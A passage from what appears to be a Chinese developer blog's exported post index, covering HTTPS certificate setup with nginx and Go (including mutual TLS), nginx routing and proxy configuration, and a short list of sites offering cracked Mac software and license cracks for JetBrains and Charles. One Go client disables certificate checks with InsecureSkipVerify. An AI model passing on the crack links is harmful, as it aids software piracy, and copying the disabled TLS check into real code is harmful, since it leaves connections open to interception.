![1](https协议_网站支持https_通过golang启动https/1.png)\n\n+ 启动keymanager(需要下载), 设置一个密码\n\n+ 浏览器拉起keymanager, 会自动生成一个csr\n\n+ DNS 验证\n\n  ![1](https协议_网站支持https_通过golang启动https/2.png)\n\n  CA 将通过查询 DNS 的 TXT 记录来确定您对该域名的所有权。您只需要在域名管理平台将生成的 TXT 记录名与记录值添加到该域名下，等待大约 1 分钟即可验证成功。\n\n  \n\n  需要你到你的域名托管服务商那里添加一条 TXT 记录，其中记录名称为第二行的内容,记录值为第三行的内容。\n\n  ![1](https协议_网站支持https_通过golang启动https/3.png)\n\n+ 生成证书并且下载, 建议保存到key manager里\n\t![1](https协议_网站支持https_通过golang启动https/4.png)\n\n+ 保存到key manager里, 有效期3个月, 选择导出证书, nginx, 2个文件crt 和 key\n  ![1](https协议_网站支持https_通过golang启动https/5.png)\n  \n+ Nginx 配置\n\n  ```nginx\n  server {\n          listen 80 default_server;#一定要加上default_server,否则多个server会找第一个为默认\n          listen [::]:80 default_server;#监听所有的ipv6的地址\n          rewrite ^ https://$http_host$request_uri? permanent; #https 跳转到 https,永久重定向向\n  }\n  server {\n          listen 443 ssl default_server;\n          listen [::]:443 ssl default_server;\n          ssl_certificate \"/etc/nginx/ssl/*.liuvv.com_chain.crt\";\n          ssl_certificate_key \"/etc/nginx/ssl/*.liuvv.com_key.key\";\n          root /home/levonfly/www;\n          index index.html;\n  }\n  ```\n\n  \n\n### 5. acme自动生成并更新证书\n\n+ https://www.liuvv.com/p/ee822cec.html\n\n\n\n### 6. golang 实现一个最简单的HTTPS Web Server\n\n+ 生成私钥和证书\n\n```\nopenssl genrsa -out server.key 2048 //生成私钥\nopenssl req -new -x509 -key server.key -out server.pem -days 3650 //生成证书\n```\n\n+ server.go\n\n```\npackage main\n\t\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\t\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"Hi, This is an example of https service in golang!\")\n}\n\t\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\thttp.ListenAndServeTLS(\":8081\", \"server.pem\", \"server.key\", nil)\n}\n\t\n```\n\n通过浏览器访问：https://localhost:8081 会出现您的连接不是私密连接, 因为我们使用的是自签发的数字证书\n\t\n\n+ 客户端访问\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t//通过设置tls.Config的InsecureSkipVerify为true，client将不再对服务端的证书进行校验。\n\tts := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}} \n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```\n\n\n### 对服务端数字证书进行验证\n\n接下来我们来验证一下客户端对服务端数字证书进行验证:\n\n- 首先我们来建立我们自己的CA，需要生成一个CA私钥和一个CA的数字证书:\n\t\n```\nopenssl genrsa -out ca.key 2048\n\t\nopenssl req -x509 -new -nodes -key ca.key -subj \"/CN=tonybai.com\" -days 5000 -out ca.crt\n```\n\n- 接下来，生成server端的私钥，生成数字证书请求，并用我们的ca私钥签发server的数字证书：\n\n```\nopenssl genrsa -out server.key 2048\n\t\nopenssl req -new -key server.key -subj \"/CN=localhost\" -out server.csr\n\t\nopenssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 5000\n```\n\n- 现在我们的工作目录下有如下一些私钥和证书文件：\n\n```\nCA:\n私钥文件 ca.key\n数字证书 ca.crt\n\nServer:\n私钥文件 server.key\n数字证书 server.crt\n```\n\n+ 客户端验证服务端数字证书\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\tts := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tRootCAs:            pool,\n\t\t\tInsecureSkipVerify: false,\n\t\t},\n\t}\n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```\n\n\n### 对客户端的证书进行校验(双向证书校验）\n\n+ 要对客户端数字证书进行校验，首先客户端需要先有自己的证书。\n\n```\nopenssl genrsa -out client.key 2048\n\t\nopenssl req -new -key client.key -subj \"/CN=tonybai_cn\" -out client.csr\n\t\nopenssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 5000\n```\n\n+ 首先server端需要要求校验client端的数字证书，并且加载用于校验数字证书的ca.crt，因此我们需要对server进行更加灵活的控制：\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"Hi, This is an example of https service in golang!\")\n}\n\t\nfunc main() {\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\ts := &http.Server{\n\t\tAddr:    \":8081\",\n\t\tHandler: http.HandlerFunc(handler),\n\t\tTLSConfig: &tls.Config{\n\t\t\tClientCAs:  pool,\n\t\t\tClientAuth: tls.RequireAndVerifyClientCert, //强制校验client端证书\n\t\t},\n\t}\n\t\n\ts.ListenAndServeTLS(\"server.crt\", \"server.key\")\n}\n```\n\n+ client端变化也很大，需要加载client.key和client.crt用于server端连接时的证书校验：\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\tcliCrt, err := tls.LoadX509KeyPair(\"client.crt\", \"client.key\")\n\tif err != nil {\n\t\tfmt.Println(\"Loadx509keypair err:\", err)\n\t\treturn\n\t}\n\t\n\tts := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tRootCAs:            pool, //client端是 RootCAs\n\t\t\tCertificates:       []tls.Certificate{cliCrt},\n\t\t\tInsecureSkipVerify: false,\n\t\t},\n\t}\n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```","tags":["http"],"categories":["https"]},{"title":"Mac破解资源软件收集","url":"%2Fp%2F6765e5a5.html","content":"\n\n\n+ 苹果软件破解 https://xclient.info/\n\n+ 苹果软件破解 https://www.waitsun.com/\n\n+ 苹果软件破解 https://www.macenjoy.co/\n\n+ 苹果软件破解 https://www.macsky.net/\n\n+ 苹果软件破解 https://macbold.com/\n\n+ 苹果软件破解 https://www.naodai.org/\n\n  <!-- more -->\n\n+ 百度云盘破解 https://github.com/proxyee-down-org/proxyee-down\n\n+ 百度云盘破解 https://www.baiduwp.com/ (需要安装ua switch插件,已失效)\n\n+ 百度云盘破解 https://github.com/b3log/baidu-netdisk-downloaderx(已失效)\n\n+ Jetbrains https://zhile.io/2018/08/25/jetbrains-license-server-crack.html\n\n+ Charles 破解  https://github.com/8enet/Charles-Crack\n\n+ cleanmymac 破解 https://macbold.com/download-cleanmymac-fully-activated-free7t5/\n\n+ ntfsformac破解 https://www.naodai.org/archives/50.html\n\n+ 小众软件: https://www.appinn.com/category   里面有比较有意思的软件和chrome插件\n\n\n\n","tags":["software"],"categories":["软件"]},{"title":"nginx的location用法和rewrite规则及proxy_pass模块","url":"%2Fp%2F51e59d76.html","content":"\n\n\n### 1. location指令\n\n根据请求的URI来设置具体规则, URI是url中除去协议\b和域名及参数后, 剩下的部分.\n\n比如请求的url为: http://www.liuvv.com/test/index.php?page=1, 则uri 为 `/test/index.php`\n\n##### 1.1 location匹配uri的规则:\n\n```\nlocation [ = | ~ | ~* | ^~ ] uri { ... }\n```\n\n+ `=`  精确匹配, uri要完全一样\n+ `^~`  这个是以某个开头, 不是正则匹配\n+ `~`  区分大小写正则匹配\n+ `~*` 不区分大小写正则匹配\n\n\n\n<!-- more -->\n\n##### 1.2 location匹配uri的优先级:\n\n1. 首先先检查使用前缀字符定义的location，选择最长匹配的项并记录下来。\n\n2. 如果找到了精确匹配的location，也就是使用了`=`修饰符的location，结束查找，使用它的配置。\n\n3. 如果`^~`修饰符先匹配到最长的前缀字符串, 则不检查正则。\n\n4. 然后按顺序查找使用正则定义的location，如果匹配则停止查找，使用它定义的配置。\n\n5. 如果没有匹配的正则location，则使用前面记录的最长匹配前缀字符location。\n\n   \n\n> 基于以上的匹配过程，我们可以得到以下启示：\n\n1. 使用正则定义的location在配置文件中出现的顺序很重要。因为找到第一个匹配的正则后，查找就停止了，后面定义的正则就是再匹配也没有机会了。\n2. 使用精确匹配可以提高查找的速度。例如经常请求`/`的话，可以使用`=`来定义location。\n3. 优先级 `=`  >  `^~`  >  正则\n\n\n\n##### 1.3 \u0010location 测试\n\n```nginx\nlocation = / {\n  return 502 \"规则A\\n\";\n}\nlocation = /login {\n  return 502 \"规则B\\n\";\n}\nlocation ^~ /static/ {\n  return 502 \"规则C\\n\";\n}\nlocation ^~ /static/files {\n  return 502 \"规则D\\n\";\n}\nlocation ~ \\.(gif|jpg|png|js|css)$ {\n  return 502 \"规则E\\n\";\n}\nlocation ~* \\.PNG$ {\n  return 502 \"规则F\\n\";\n}\nlocation /img {\n  return 502 \"规则G\\n\";\n}\nlocation / {\n  return 502 \"规则H\\n\";\n}\n```\n\n测试结果:\n\n```bash\nlevonfly@hk:~$ curl test.liuvv.com # 因为是=\n规则A\nlevonfly@hk:~$ curl test.liuvv.com/ # 因为是=\n规则A\nlevonfly@hk:~$ curl test.liuvv.com/login # 因为是=\n规则B\nlevonfly@hk:~$ curl test.liuvv.com/login/ # 多了/, 参考下面3.5\n规则H\nlevonfly@hk:~$ curl test.liuvv.com/abc\n规则H\n\nlevonfly@hk:~$ curl test.liuvv.com/static/a.html \n规则C\nlevonfly@hk:~$ curl test.liuvv.com/static/files/a.html # 更加精准\n规则D\n\nlevonfly@hk:~$ curl test.liuvv.com/a.png # 正则精准\n规则E\nlevonfly@hk:~$ curl test.liuvv.com/a.PNG # 正则精准\n规则F\nlevonfly@hk:~$ curl test.liuvv.com/static/a.png # ^~ 优先级更高\n规则C\n\nlevonfly@hk:~$ curl test.liuvv.com/img/a.gif #正则匹配优先\n规则E\nlevonfly@hk:~$ curl test.liuvv.com/img/a.tiff\n规则G\nlevonfly@hk:~$ curl test.liuvv.com/abc/123/haha #什么都匹配不到, 就到H\n规则H\n```\n\n\n\n##### 1.4 location @name的用法\n\n@用来定义一个命名location。主要用于内部重定向，不能用来处理正常的请求。其用法如下：\n\n```nginx\nlocation / {\n    try_files $uri $uri/ @custom\n}\nlocation @custom {\n    # ...do something\n}\n```\n\n上例中，当尝试访问url找不到对应的文件就重定向到我们自定义的命名location（此处为custom）。\n\n值得注意的是，命名location中不能再嵌套其它的命名location。\n\n\n\n\n##### 1.5 root和alias的区别\n\nnginx指定文件路径有两种方式root和alias.\n\n- root\n\n```\n[root]\n语法：root path\n默认值：root html\n配置段：http、server、location、if\n```\n\n例如:\n\n```nginx\nlocation ^~ /t/ { \n     root /www/root/html/;\n}\n```\n\n如果一个请求的URI是/t/a.html时，web服务器将会返回服务器上的/www/root/html/t/a.html的文件。\n\n- alias\n\n```\n[alias]\n语法：alias path\n配置段：location\n```\n\n例如:\n\n```nginx\nlocation ^~ /t/ { # 特殊的规则是, alias必须以\"/\" 结束\n alias /www/root/html/new_t/;\n}\n```\n\n如果一个请求的URI是/t/a.html时，web服务器将会返回服务器上的/www/root/html/new_t/a.html的文件。注意这里是new_t，因为alias会把location后面配置的路径丢弃掉，把当前匹配到的目录指向到指定的目录。\n\n\n\n##### 1.6 nginx显示目录结构\n\nnginx默认是不允许列出整个目录的。如需此功能, 在server或location 段里添加上autoindex on;\n\n```nginx\nautoindex_exact_size off;\n默认为on，显示出文件的确切大小，单位是bytes。\n改为off后，显示出文件的大概大小，单位是kB或者MB或者GB\n\nautoindex_localtime on;\n默认为off，显示的文件时间为GMT时间。\n改为on后，显示的文件时间为文件的服务器时间\n```\n\n可以下面的例子:\n\n```nginx\nlocation ^~ \"/upload-preview\" {\n\t\talias /tmp/cistern/;\n\t\tautoindex on;\n\t\tautoindex_localtime on;\n}\n```\n\n\n\n##### 1.7 URL尾部的`/`需不需要\n\n关于URL尾部的`/`有三点也需要说明一下。第一点与location配置有关，其他两点无关。\n\n+ location配置中的字符有没有`/`都没有影响(只是location, 不是alias)。也就是说`/user/`和`/user`是一样的。\n\n+ 如果URL结构是`https://domain.com/`的形式，尾部有没有`/`都不会造成重定向。因为浏览器在发起请求的时候，默认加上了`/`。虽然很多浏览器在地址栏里也不会显示`/`。这一点，可以访问[baidu](https://www.baidu.com/)验证一下。\n\n+ 如果URL的结构是`https://domain.com/some-dir/`。尾部如果缺少`/`将导致重定向。因为根据约定，URL尾部的`/`表示目录，没有`/`表示文件。\n\n  所以访问`/some-dir/`时，服务器会自动去该目录下找对应的默认文件。如果访问`/some-dir`的话，服务器会先去找`some-dir`文件，找不到的话会将`some-dir`当成目录，重定向到`/some-dir/`，去该目录下找默认文件。\n\n\n\n### 2. rewirte规则\n\n\n##### 2.1 return指令\n\nreturn指令写在server和location里面\n\n```nginx\nreturn code [text];\nreturn code URL;\nreturn URL;\n```\n\n我们来看下面这个例子\n\n```nginx\n return 301 $scheme://www.baidu.com$request_uri; \n```\n\nreturn 指令告诉 nginx 停止处理请求, 直接返回301代码和指定\b重写过的URL到客户端. $scheme是指\b协议(http),$request_uri指\b包含参数的完整URI \n\n\n\n对于 3xx 系列响应码, url参数就是重写的url\n\n```nginx\nreturn (301 | 302 | 303 | 307) url;\n```\n\n对于其他响应吗, 可以出现一个字符串\n\n```nginx\nreturn (1xx | 2xx | 4xx | 5xx)[\"text\"]\n```\n\n例如:\n\n```nginx\nreturn 401 \"Access denied because token is expired or invalid\";\n```\n\n\n\n##### 2.2 rewrite指令\n\nrewrite指令写在server和location里面, 规则会改变部分或整个用户的URL.\n\n```nginx\nrewrite regex URL [flag]\n```\n\n1. regex 正则表达式\n\n2. flag\n\n   + last\n\n     停止当前这个请求，并根据rewrite匹配的规则重新发起一个请求。新请求又从第一阶段开始执行, 找寻新的location\n\n   + break\n\n     break并不会重新发起一个请求，只是跳过当前的rewrite阶段，并执行本请求后续的执行阶段, 在同一个location里处理\n\n   + redirect\n\n     返回包含302的临时重定向\n\n   + permanent\n\n     返回包含301的永久重定向\n\n3. rewrite只能返回301或302, 如果有其他,需要后面加上return, 例如:\n\n```nginx\nrewrite ^(/download/.*)/media/(\\w+)\\.?.*$ $1/mp3/$2.mp3 last;\nrewrite ^(/download/.*)/audio/(\\w+)\\.?.*$ $1/mp3/$2.ra  last;\nreturn  403;\n```\n\n+ 匹配/download开头的URL,  然后替换相关路径\n+ `/download/cdn-west/media/file1` -> `/download/cdn-west/mp3/file1.mp3`\n\n+ 如果匹配不上, 将返回客户端403\n\n\n\n##### 2.3 try_files\n\ntry_files指令写在server和location里面.\n\n```nginx\nry_files file ... uri 或 try_files file ... = code\n```\n\ntry_files 指令的参数是一个或多个文件或目录的列表, 以及后面的uri参数. nginx会按照顺序检查文件或目录是否存在, 并用找到的第一个文件提供服务. 如果都不存在, 内部重定向到最后的这个uri\n\n例如:\n\n```nginx\nlocation /images/ {\n    try_files $uri $uri/ /images/default.gif;\n}\n\nlocation = /images/default.gif {\n    expires 30s;\n}\n```\n\ntry_files常用的变量:\n\n+ $uri 表示域名以后的部分\n\n+ $args  请求url中 ? 后面的参数 (不包括?本身)\n\n+ $is_args  判断$args是否为空\n\n  ```nginx\n  try_files $uri $uri/ /index.php$is_args$args; #这样就能避免多余的?号\n  ```\n  \n+ $query_string 和 $args相同\n\n+ $document_root root指令指定的值\n\n+ $request_filename 请求的文件路径\n\n+ $request_uri 原始请求uri  \n\n\n\n我们看个例子:\n\n```nginx\ntry_files /app/cache/ $uri @fallback; \nindex index.php index.html;\n```\n\n它将检测$document_root/app/cache/index.php,$document_root/app/cache/index.html 和 $document_root$uri是否存在，如果不存在着内部重定向到@fallback(＠表示配置文件中预定义标记点) 。\n\n你也可以使用一个文件或者状态码(=404)作为最后一个参数，如果是最后一个参数是文件，那么这个文件必须存在。\n\n\n\n我们来看一个错误:\n\n```nginx\nlocation ~.*\\.(gif|jpg|jpeg|png)$ {\n        root /web/wwwroot;\n        try_files /static/$uri $uri;\n}\n```\n\n原意图是访问`http://example.com/test.jpg`时先去检查`/web/wwwroot/static/test.jpg`是否存在，不存在就取`/web/wwwroot/test.jpg`\n\n但由于最后一个参数是一个内部重定向，所以并不会检查`/web/wwwroot/test.jpg`是否存在，只要第一个路径不存在就会重新向然后再进入这个location造成死循环。结果出现500 Internal Server Error\n\n```nginx\nlocation ~.*\\.(gif|jpg|jpeg|png)$ {\n        root /web/wwwroot;\n        try_files /static/$uri $uri 404;\n}\n```\n\n这样才会先检查`/web/wwwroot/static/test.jpg`是否存在，不存在就取`/web/wwwroot/test.jpg`再不存在则返回404 not found\n\n\n\n##### 2.4 if指令\n\nif不是系统级的指令, 是和rewrite配合的. if 必须写在server和location里面.\n\n- 变量名:   如果是空字符串或\"0\"为FALSE\n- = 判断相等, != 判断不相等\n- ~ 和 ~*(不分区大小写) 将变量与正则匹配, 捕获可以用 $1 到 $9\n- !~ 和 !~* 用作不匹配运算符\n- 正则含有 } 或 ; 字符需要用引号括起来\n- 常用判断指令\n  - -f 和 !-f 判断是否存在文件(file)\n  - -d 和 !-d 判断是否存在目录(directory)\n  - -e 和 !-e 判断是否存在文件或目录(exists)\n  - -x 和 !-x 判断文件是否可执行(execute)\n\n\n\n例如下面的列子:\n\n```nginx\nif ($http_user_agent ~ Chrome) {\n    rewrite ^([^/]*)$ /chrome$1 break;\n}\n\nif ($request_method = POST){\n    return 405;\n}\n\nif (-f $request_filename) {\n    expires max;\n    break;\n}\n```\n\n\n\n### 3. proxy_pass模块\n\nproxy_pass指令是将请求反向代理到URL参数指定的服务器上，URL可以是主机名或者IP地址+端口号的形式，例如：\n\n```\nproxy_pass http://proxy_server;\nproxy_pass http://192.168.9.2:8000;\nproxy_pass https://192.168.9.2:8000;\n```\n\nproxy_pass模块基本配置： \n+ proxy_set_header：设置服务器获取用户的主机名或者真实ip地址，以及代理者的真实ip地址。 \n+ client_body_buffer_size：用于指定客户端请求主体缓冲区大小，可以理解为先保存到本地再传给用户 \n+ proxy_connect_timeout：表示连接服务器的超时时间，即发起tcp握手等候响应的超时时间 \n+ proxy_send_time：服务器的数据传回时间，在规定时间内服务器必须传回完所有数据，否则，nginx将断开这个连接 \n+ proxy_read_time：设置nginx从代理的后端服务器获取数据的时间，表示连接建立成功后，+ nginx等待服务器的响应时间，其实是nginx已经进入服务器的排队中等候处理的时间。 \n+ proxy_buffer_size：设置缓冲区大小，默认该缓冲区大小等于proxy_buffers设置的大小 \n+ proxy_buffers：设置缓冲区的数量和大小，nginx从代理的服务器获取响应数据会放置到缓冲区 \n+ proxy_busy_buffers_size：用于设置系统很忙时可以使用的proxy_buffers大小，官方推荐大小为proxy_buffers*2 \n+ proxy_temp_file_write_size：指定proxy缓存临时文件的大小\n\n\n\n##### 3.1 proxy_set_header\n\n```bash\n语法:    proxy_set_header field value;\n默认值:    \nproxy_set_header Host $proxy_host; # 注意这个是proxy_host\nproxy_set_header Connection close;\n\n\n上下文:    http, server, location\n```\n\n允许重新定义或者添加发往后端服务器的请求头。value可以包含文本、变量或者它们的组合。 当且仅当当前配置级别中没有定义proxy_set_header指令时，会从上面的级别继承配置。默认情况下，只有两个请求头会被重新定义：\n\n```nginx\nproxy_set_header Host       $proxy_host;\nproxy_set_header Connection close;\n```\n\n\n\nproxy_set_header也可以自定义参数，如：proxy_set_header test paroxy_test;\n\n如果想要支持下划线的话，需要增加如下配置：`underscores_in_headers on`; \n\n```bash\n语法：underscores_in_headers on|off\n默认值：off\n使用字段：http, server\n是否允许在header的字段中带下划线\n```\n\n\n\n##### 3.2 遇到的问题\n\n> 经过反向代理后，由于在客户端和web服务器之间增加了中间层，因此web服务器无法直接拿到客户端的ip, 通过$remote_addr变量拿到的将是反向代理服务器的ip地址. 如果我们想要在web端获得用户的真实ip，就必须在nginx这里作一个赋值操作，如下：\n\n```nginx\nproxy_set_header            X-real-ip $remote_addr;\n```\n\n其中这个X-real-ip是一个自定义的变量名，名字可以随意取，这样做完之后，用户的真实ip就被放在X-real-ip这个变量里了，然后，在web端可以这样获取：request.getAttribute(\"X-real-ip\")\n\n\n\n>  通常我们会看到有这样一些配置:\n\n```\nserver {\n        server_name liuwei.fhyx.com;\n\n        proxy_set_header       X-Real-IP $remote_addr;\n        proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header       Host $http_host;\n        proxy_redirect         off;\n        proxy_http_version     1.1;\n        proxy_set_header       Upgrade $http_upgrade;\n        proxy_set_header       Connection \"upgrade\";\n        proxy_buffering        off;\n\n        location / {\n                proxy_pass     http://127.0.0.1:8000;\n        }\n\n        location ~ \"/(box|c|bub)/\" {\n                proxy_pass     http://127.0.0.1:8081;\n        }\n\n        location ~ /(a|o2)/ {\n                proxy_pass     http://127.0.0.1:3010;\n        }\n\n        location ~ \"/api/(v\\d{1,2})/\" {\n                proxy_pass     http://127.0.0.1:5010;\n        }\n\n}\n```\n\n##### proxy_set_header   X-real-ip $remote_addr;\n\n这句话之前已经解释过，有了这句就可以在web服务器端获得用户的真实ip, 但是，实际上要获得用户的真实ip，不是只有这一个方法。\n\n##### proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;\n\nX-Forwarded-For 是一个 HTTP 扩展头部。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 [RFC 7239](http://tools.ietf.org/html/rfc7239)（Forwarded HTTP Extension）标准之中。\n\nX-Forwarded-For 请求头格式非常简单，就这样：\n\n```bash\nX-Forwarded-For: client, proxy1, proxy2\n```\n\n可以看到，XFF 的内容由「英文逗号 + 空格」隔开的多个部分组成，最开始的是离服务端最远的设备 IP，然后是每一级代理设备的 IP。\n\n 如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息：\n\n  ```bash\nX-Forwarded-For: IP0, IP1, IP2\n  ```\n\nProxy3 直连服务器，它会给 XFF 追加 IP2，表示它是在帮 Proxy2 转发请求。列表中并没有 IP3，IP3 可以在服务端通过 Remote Address 字段获得。我们知道 HTTP 连接基于 TCP 连接，HTTP 协议中没有 IP 的概念，Remote Address 来自 TCP 连接，表示与服务端建立 TCP 连接的设备 IP，在这个例子里就是 IP3。\n\nRemote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求。不同语言获取 Remote Address 的方式不一样，例如 php 是 `$_SERVER[\"REMOTE_ADDR\"]`，Node.js 是 `req.connection.remoteAddress`，但原理都一样。\n\n对于 Web 应用来说，`X-Forwarded-For` 和 `X-Real-IP` 就是两个普通的请求头，自然就不做任何处理原样输出了。这说明，对于直连部署方式，除了从 TCP 连接中得到的 Remote Address 之外，请求头中携带的 IP 信息都不能信。  \n\n##### proxy_set_header       Host $http_host;\n\n- $host：请求中的主机头(HOST)字段，如果请求中的主机头不可用或者空，则为处理请求的server名称(处理请求的server的server_name指令的值)。值为小写，不包含端口!!!!\n\n- 如果客户端发过来的请求的header中有’HOST’这个字段时，`$http_host`和`$host`都是原始的’HOST’字段比如请求的时候HOST的值是www.csdn.net 那么反代后还是www.csdn.net\n  \n  如果客户端发过来的请求的header中没有有’HOST’这个字段时， 建议使用$host，这表示请求中的server name。\n  \n\n\n\n### 4. websocket反向代理\n\n+ nginx 首先确认版本必须是1.3以上。\n\n+ map指令的作用： 该作用主要是根据客户端请求中$http_upgrade的值，来构造改变$connection_upgrade的值，即根据变量$http_upgrade的值创建新的变量$connection_upgrade， 创建的规则就是{}里面的东西。其中的规则没有做匹配，因此使用默认的，即 $connection_upgrade的值会一直是 upgrade。然后如果 $http_upgrade为空字符串的话， 那值会是 close。\n\n```nginx\n#必须添加的\nmap $http_upgrade $connection_upgrade {\n        default upgrade;\n        '' close;\n}\n\nupstream websocket {\n    ip_hash;\n    #转发到服务器上相应的ws端口\n    server localhost:3344;\n    server localhost:8011;\n}\nserver {\n    listen 80;\n    server_name a.liuvv.com;\n    location / {\n    \n        #转发到http://websocket\n        proxy_pass http://websocket;\n        proxy_read_timeout 300s;\n        proxy_send_timeout 300s;\n\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    \n        #升级http1.1到 websocket协议  \n        proxy_http_version 1.1;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection  $connection_upgrade;\n    }\n}\n```\n\n\n\n\n\n### 5. 参考资料:\n\n+ https://nginx.org/en/docs/\n+ [Nginx配置location、if以及return、rewrite和 try_files 指令](https://www.xiebruce.top/710.html)\n+ [Nginx 基本功能 - 将 Nginx 配置为 Web 服务器](https://blog.csdn.net/kikajack/article/details/79322194)\n+ [Nginx 的 try_files 指令使用实例](https://www.hi-linux.com/posts/53878.html)\n+ [HTTP 请求头中的 X-Forwarded-For](https://imququ.com/post/x-forwarded-for-header-in-http.html)","tags":["nginx"],"categories":["nginx"]},{"title":"nginx介绍和常用模块配置","url":"%2Fp%2F7245bfc7.html","content":"\nNginx功能丰富，可作为HTTP服务器，也可作为反向代理服务器，邮件服务器。支持FastCGI、SSL、Virtual Host、URL Rewrite、Gzip等功能。并且支持很多第三方的模块扩展。\n\n\n\n# 零. 前言\n\n### 0.1 配置文件在哪\n\n安装好nginx我们首先要知道配置文件在哪里?\n\n![1](nginx_config/1.png)\n\n\n\n说明nginx的主配置文件都在 `/etc/nginx/nginx.conf`里. 打开文件我们还可以看到\n\n```ngnix\ninclude /etc/nginx/conf.d/*.conf;\ninclude /etc/nginx/sites-enabled/*;\n```\n\n\n\n需要添加新配置选项的地方位于 sites-enabled 文件夹。如果你打开这个文件夹，你会发现一个名为 default 的文档，打开后你就会找到nginx的配置选项, 当你安装好nginx默认看到的首页就是在这里配置的.\n\n\n\n在该目录下还有一个 sites-available 的文件夹, 这个文件夹一般在你需要建立和管理多个站点的时候非常有用，可以帮助你更好的组织不同的项目。你需要在这里添加你的nginx配置文案并将他们链接至 sites-enabled 目录下。\n\n\n\n只有在 sites-enabled 目录下的配置文件才能够真正被用户访问。但是你同样可以将文件放在 sites-available 目录下用来存档或者生成链接。\n\n<!-- more -->\n\n\n\n### 0.2 默认root在哪\n\n```bash\nnginx -V\nit lists --prefix as the first one.\n```\n\n\n\n### 0.3 重启nginx\n\n```bash\nsudo nginx -s reload\n```\n\nreload，重新加载的意思，reload会重新加载配置文件，nginx服务不会中断，而且reload时会测试conf语法等，如果出错会rollback用上一次正确配置文件保持正常运行。\n\nrestart，重启，会重启nginx服务。这个重启会造成服务一瞬间的中断，当然如果配置文件出错会导致服务启动失败，那就是更长时间的服务中断了。\n\n\n\n# 一. nginx 常用功能说明\n\n\n\n### 1.1 反向代理\n\n下面一张图是对正向代理与反响代理的对比\n\n\n![1](nginx_config/1.jpg)\n\nNginx在做反向代理时，提供性能稳定，并且能够提供配置灵活的转发功能。Nginx可以根据不同的正则匹配，采取不同的转发策略，比如图片文件结尾的走文件服务器，动态页面走web服务器，只要你正则写的没问题，又有相对应的服务器解决方案，你就可以随心所欲的玩。并且Nginx对返回结果进行错误页跳转，异常判断等。如果被分发的服务器存在异常，他可以将请求重新转发给另外一台服务器，然后自动去除异常服务器。\n\n\n\n### 1.2 负载均衡\n\nNginx提供的负载均衡策略有2种：内置策略和扩展策略。\n\n内置策略为轮询，加权轮询，Ip hash。扩展策略，就天马行空，只有你想不到的没有他做不到的啦，你可以参照所有的负载均衡算法，给他一一找出来做下实现。\n\n\n\n看下面的图理解三种负载均衡算法的实现\n\n![1](nginx_config/2.jpg)\n\n\n\nIp hash算法，对客户端请求的ip进行hash操作，然后根据hash结果将同一个客户端ip的请求分发给同一台服务器进行处理，可以解决session不共享的问题。\n\n![1](nginx_config/3.jpg)\n\n\n\n### 1.3 